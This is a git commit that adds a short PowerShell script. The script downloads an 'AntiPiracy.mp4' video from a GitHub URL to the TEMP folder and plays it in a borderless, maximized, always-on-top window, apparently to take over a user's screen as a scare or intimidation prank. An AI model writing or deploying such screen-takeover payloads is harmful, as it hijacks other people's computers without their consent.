a26c64d6e9c648c2f3c82ece0ceaac18017dede2
ios <validszatm@gmail.com>
2026-07-12 22:14:36 +0100

    Create ps1.ps1

---
+++ ps1.ps1
@@ -0,0 +1,19 @@
+$t = "$env:TEMP\v.mp4"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/iosviolador/Vox-Utils/refs/heads/main/AntiPiracy.mp4" -OutFile $t
+while (!(Test-Path $t) -or (Get-Item $t).Length -lt 100000) {
+    Start-Sleep -Seconds 1
+}
+Add-Type -AssemblyName PresentationFramework
+
+$w = New-Object Windows.Window
+$w.WindowStyle = "None"
+$w.WindowState = "Maximized"
+$w.Topmost = $true
+
+$m = New-Object Windows.Controls.MediaElement
+$m.Source = $t
+$m.LoadedBehavior = "Play"
+$m.Stretch = "Fill"
+
+$w.Content = $m
+$w.ShowDialog() | Out-Null
